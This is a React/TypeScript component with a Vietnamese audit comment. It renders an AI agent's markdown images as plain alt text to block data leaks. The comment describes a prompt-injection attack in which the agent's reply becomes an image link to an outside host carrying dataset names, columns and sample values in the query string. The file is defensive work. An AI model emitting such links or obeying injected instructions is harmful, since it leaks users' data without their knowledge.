import { createElement } from "react";

/**
 * Ảnh trong markdown của agent (audit AG-07): KHÔNG render <img>. Trình duyệt tải ảnh ngay khi tin nhắn hiện ra,
 * nên một câu trả lời bị prompt injection lái thành `![x](https://host-la/?d=<dữ liệu>)` sẽ gửi dữ liệu agent đã
 * thấy (tên / id dataset, tên cột, giá trị mẫu) ra ngoài mà người dùng không cần bấm gì. Agent không tạo ảnh nào
 * hợp lệ, nên chỉ hiện chữ thay thế; URL không xuất hiện trong DOM (không src, không href).
 */
export function MarkdownImage({ alt }: { alt?: string; src?: string }) {
  const label = (alt ?? "").trim();
  return createElement(
    "span",
    { className: "rounded bg-automl-surface-muted px-1 py-0.5 text-[12.5px] text-automl-muted-strong" },
    label ? `🖼 ${label}` : "🖼",
  );
}
